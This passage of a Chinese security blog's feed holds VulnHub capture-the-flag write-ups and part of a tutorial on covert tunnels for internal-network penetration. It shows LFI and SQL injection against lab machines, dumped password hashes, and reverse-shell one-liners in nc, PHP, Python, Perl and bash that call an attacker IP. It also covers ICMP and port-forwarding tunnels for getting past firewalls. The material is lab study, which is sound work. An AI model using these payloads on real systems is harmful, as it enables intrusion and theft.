phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Cookie SQMSESSID created without the httponly flag</span><br><span class="line">+ OSVDB-3093: /mail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ /info.php: Output from the phpinfo() <span class="keyword">function</span> was found.</span><br><span class="line">+ OSVDB-3233: /info.php: PHP is installed, and a <span class="built_in">test</span> script <span class="built_in">which</span> runs phpinfo() was found. This gives a lot of system information.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake<span class="string">&#x27;s list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/</span></span><br><span class="line"><span class="string">+ /phpmyadmin/: phpMyAdmin directory found</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ 8724 requests: 0 error(s) and 26 item(s) reported on remote host</span></span><br><span class="line"><span class="string">+ End Time:           2022-02-16 01:30:19 (GMT-5) (25 seconds)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ 1 host(s) tested</span></span><br></pre></td></tr></table></figure><p>可以看到有LFI/RFI</p><p><code>http://192.168.188.131//index.php?page=../../../../../../../../../etc/passwd%00</code></p><p><code>root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash </code></p><p>搜下底部关于nanocms的洞，：<a href="https://vulners.com/openvas/OPENVAS:100141">https://vulners.com/openvas/OPENVAS:100141</a></p><p>有个是密码散列信息泄露，允许不受限制地访问：/data/pagesdata.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:12:&#123;s:8:&quot;homepage&quot;;s:1:&quot;1&quot;;s:10:&quot;links_cats&quot;;a:4:&#123;s:7:&quot;sidebar&quot;;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:&quot;other-pages&quot;;a:0:&#123;&#125;s:14:&quot;top-navigation&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;s:12:&quot;Footer-Right&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;&#125;s:5:&quot;slugs&quot;;a:2:&#123;i:1;s:4:&quot;home&quot;;i:4;s:7:&quot;contact&quot;;&#125;s:6:&quot;titles&quot;;a:2:&#123;i:1;s:4:&quot;Home&quot;;i:4;s:7:&quot;Contact&quot;;&#125;s:10:&quot;slug_count&quot;;i:11;s:8:&quot;settings&quot;;a:3:&#123;s:19:&quot;index-last-modified&quot;;i:1234513760;s:18:&quot;def-template-areas&quot;;a:4:&#123;i:0;s:12:&quot;website name&quot;;i:2;s:14:&quot;website slogan&quot;;i:3;s:16:&quot;below navigation&quot;;i:4;s:16:&quot;copyright notice&quot;;&#125;s:18:&quot;def-template-links&quot;;a:2:&#123;i:0;s:14:&quot;top-navigation&quot;;i:1;s:12:&quot;Footer-Right&quot;;&#125;&#125;s:13:&quot;active-tweaks&quot;;a:2:&#123;i:0;s:7:&quot;deutsch&quot;;i:1;s:19:&quot;language-pack-tweak&quot;;&#125;s:11:&quot;lang-select&quot;;s:7:&quot;english&quot;;s:6:&quot;seourl&quot;;s:1:&quot;0&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;s:7:&quot;version&quot;;s:4:&quot;v_4f&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到admin的密码的hash解密为shannon</p><p>登进去后直接newpage，使用msfvenom反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/VulnHub02/image-20220216211315347.png" alt="image-20220216211315347"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>或者直接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">--------</span><br><span class="line">nc -lp 4444</span><br></pre></td></tr></table></figure><p>通过以下命令在home下找root密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i password /home/* 2&gt; /dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/VulnHub02/image-20220216214354852.png" alt="image-20220216214354852"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-3.2$ su</span><br><span class="line">standard <span class="keyword">in</span> must be a tty</span><br><span class="line">bash-3.2$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh-3.2$ id</span><br><span class="line">id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0</span><br><span class="line">sh-3.2$ su</span><br><span class="line">su</span><br><span class="line">Password: 50<span class="variable">$cent</span></span><br><span class="line"></span><br><span class="line">[root@localhost public_html]<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost public_html]<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>进去直接su的时候提示：<code>standard in must be a tty</code>，直接：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download:&lt;a href=&quot;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&quot;&gt;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;扫描之</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_01_LAMPSECURITY: CTF4</title>
    <link href="http://example.com/2022/02/16/VulnHub01/"/>
    <id>http://example.com/2022/02/16/VulnHub01/</id>
    <published>2022-02-15T16:00:00.000Z</published>
    <updated>2022-02-16T05:54:11.754Z</updated>
    
    <content type="html"><![CDATA[<p>开始打vulnhub</p><p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf4,83/</code></p><p>扫描：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br><span class="line">nmap -sT -sV -O 192.168.188.0/24</span><br></pre></td></tr></table></figure><p>发现为<code>192.168.188.130</code></p><p>nmap扫下：</p><blockquote><p>  nmap -A :检测操作系统和服务</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.188.130                                                                                                                                                                                                            130 ⨯</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 00:23 EST</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 41.60% <span class="keyword">done</span>; ETC: 00:23 (0:00:04 remaining)</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 45.40% <span class="keyword">done</span>; ETC: 00:23 (0:00:04 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.130</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)</span><br><span class="line">|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)</span><br><span class="line">25/tcp  open   smtp    Sendmail 8.13.5/8.13.5</span><br><span class="line">| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.188.129], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, </span><br><span class="line">|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="string">&quot;HELP &lt;topic&gt;&quot;</span>. 2.0.0 To report bugs <span class="keyword">in</span> the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For <span class="built_in">local</span> information send email to Postmaster at your site. 2.0.0 End of HELP info </span><br><span class="line">80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))</span><br><span class="line">| http-robots.txt: 5 disallowed entries </span><br><span class="line">|_/mail/ /restricted/ /conf/ /sql/ /admin/</span><br><span class="line">|_http-server-header: Apache/2.2.0 (Fedora)</span><br><span class="line">|_http-title:  Prof. Ehks </span><br><span class="line">631/tcp closed ipp</span><br><span class="line">MAC Address: 00:0C:29:28:D9:61 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|proxy server|remote management|terminal server|switch|WAP</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (98%), SonicWALL embedded (95%), Control4 embedded (95%), Lantronix embedded (95%), SNR embedded (95%), Dell iDRAC 6 (94%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.1</span><br><span class="line">Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), SonicWALL Aventail EX-6000 VPN appliance (95%), Control4 HC-300 home controller (95%), Lantronix SLC 8 terminal server (Linux 2.6) (95%), SNR SNR-S2960 switch (95%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.18 - 2.6.32 (94%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: ctf4.sas.upenn.edu; OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.57 ms 192.168.188.130</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开了22,25,80.</p><p>访问blog，url有注入，sqlmap直接跑。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.188.130/index.html?page=blog&amp;title=Blog&amp;id=7%27&quot;</span> -D ehks -T user --dump</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p>ssh练了一次连不上，搜了下加个参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group1-sha1 achen@192.168.188.130 </span><br></pre></td></tr></table></figure><p>进去之后<code>sudo -l</code>，可以看到该用户可以执行root的所有命令，但是不是所有用户都可以，比如pmoore就不行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始打vulnhub&lt;/p&gt;
&lt;p&gt;download：&lt;code&gt;https://www.vulnhub.com/entry/lampsecurity-ctf4,83/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;扫描：&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-隧道隐藏</title>
    <link href="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <id>http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-10T07:11:43.716Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h1><p>当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。</p><p>在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。</p><p>但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。</p><h1 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h1><p>网络层：IPV6隧道、ICMP隧道</p><p>传输层：TCP隧道、UDP隧道、端口转发</p><p>应用层：SSH隧道、HTTP(S)隧道、DNS隧道</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="1-IPV6隧道"><a href="#1-IPV6隧道" class="headerlink" title="1.IPV6隧道"></a>1.IPV6隧道</h3><blockquote><p>  工具：6tunnel（kali自带）</p><p>  靶机：winserver2008</p><p>  攻击机：kali</p></blockquote><p>首先要开启靶机的IPV6</p><p><img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"></p><p>之后查看靶机的ipv6地址，假设为aaaa:bbbb:cccc:dddd</p><p>在kali：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080</span><br><span class="line"><span class="comment">#将靶机的80端口（ipv6）转发到本地的80端口（ipv4）</span></span><br></pre></td></tr></table></figure><p>之后访问本地的80端口就可访问目标机的服务</p><h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><p>一般通信都需要端口的开启，ICMP则不需要开放任何端口。</p><p>渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破</p><h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><blockquote><p>  工具：icmpsh</p><p>  download：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>  需要python的impacket类库：apt-get install python4-impacket</p><p>  由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure></blockquote><p>之后跑run.sh脚本即可，输入靶机与攻击机IP后会给出要在靶机上运行的指令</p><p>执行后即可回弹shell</p><h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>网络的拓扑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br></pre></td></tr></table></figure><p>可访问web服务，但不能访问数据库服务器；web服务器只能通过icmp访问数据库服务器。</p><blockquote><p>  工具：pingtunnel</p><p>  make &amp;make install</p></blockquote><p>在web服务器上也要装，之后<code>ptunnel -x aaa</code>(在web服务器上开启一个密码为aaa的icmp隧道)</p><p>在攻击机上：<code>ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa</code></p><p>(当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以aaa为密码的ICMP隧道传送到攻击机的1080端口上)</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h4 id="1-端口转发"><a href="#1-端口转发" class="headerlink" title="1.端口转发"></a>1.端口转发</h4><blockquote><p>  工具：lcx</p><p>  download：<a href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p></blockquote><p>lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接</p><blockquote><p>  攻击机：192.168.1.2</p></blockquote><p>在靶机上：<code>lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389</code></p><p>(将本机的3389端口转发到攻击机的4444端口)</p><p>在攻击机上：<code>./portmap -m 2 -p1 4444 -h2 192.168.1.2 -p2 5555</code></p><p>（将本地的4444端口接收的数据转发到5555端口）</p><p>然后访问本机的5555端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali下可：rdesktop &quot;127.0.0.1:5555&quot;</span><br><span class="line">win下直接远程桌面链接：127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p 指定端口</span><br><span class="line">-v 显示细节</span><br><span class="line">-u 使用UDP传输协议</span><br><span class="line">-l 监听模式</span><br><span class="line">-w 设置超时时间</span><br></pre></td></tr></table></figure><h5 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h5><p><strong>正向shell</strong></p><p>正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截</p><p>靶机中：<code>nc -lvp 4444 -e /bin/sh</code>（把/bin/sh发送给请求本机4444端口的中断）</p><p>攻击机上：<code>nc 192.168.1.2 4444</code></p><p><strong>反向shell</strong></p><p>受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁</p><p>攻击机上：<code>nc -lvp 5555</code></p><p>靶机上：    <code>nc 192.168.1.4 5555 -e /bin/sh</code></p><p>这是在靶机上已经装了nc攻击，若没装的话，可使用其他来反弹shell：</p><h6 id="1-用pyhton反弹shell"><a href="#1-用pyhton反弹shell" class="headerlink" title="1.用pyhton反弹shell"></a>1.用pyhton反弹shell</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机IP&quot;,攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="2-php反弹shell"><a href="#2-php反弹shell" class="headerlink" title="2.php反弹shell"></a>2.php反弹shell</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听的端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="3-perl反弹shell"><a href="#3-perl反弹shell" class="headerlink" title="3.perl反弹shell"></a>3.perl反弹shell</h6><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="4-bash反弹shell"><a href="#4-bash反弹shell" class="headerlink" title="4.bash反弹shell"></a>4.bash反弹shell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(攻击机ip)/6666 0&gt;&amp;1</span><br><span class="line">将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口</span><br></pre></td></tr></table></figure><h4 id="3-Powercat"><a href="#3-Powercat" class="headerlink" title="3.Powercat"></a>3.Powercat</h4><blockquote><p>  download：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p></blockquote><p>工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat</p><p>执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure><p>如果权限不够需要修改权限：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure><p>部分参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c 指定一个ip地址</span><br><span class="line">-p 指定一个端口</span><br><span class="line">-v 显示详情</span><br><span class="line">-l 监听模式</span><br><span class="line">-e 程序重定向</span><br></pre></td></tr></table></figure><h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机</span></span><br></pre></td></tr></table></figure><p>攻击机：</p><p><code>nc 192.168.1.2 8888 -vv</code></p><h3 id="反向链接"><a href="#反向链接" class="headerlink" 